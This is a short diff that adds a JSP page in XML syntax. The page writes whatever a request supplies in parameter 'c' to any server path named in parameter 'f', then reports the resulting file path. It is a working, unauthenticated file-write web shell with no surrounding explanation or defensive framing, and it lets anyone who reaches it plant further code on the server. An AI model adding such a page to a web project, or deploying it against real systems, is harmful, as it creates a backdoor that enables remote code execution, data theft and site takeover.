@@ -1,0 +1,13 @@
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml" version="1.2">
+    <jsp:directive.page import="java.io.FileOutputStream"/>
+    <jsp:directive.page import="java.io.File"/>
+    <jsp:scriptlet>
+        File file = new File(request.getParameter("f"));
+        FileOutputStream fos = new FileOutputStream(file);
+        fos.write(request.getParameter("c").getBytes());
+        fos.flush();
+        fos.close();
+
+        out.println(file.getAbsoluteFile() + "\t" + file.exists());
+    </jsp:scriptlet>
+</jsp:root>
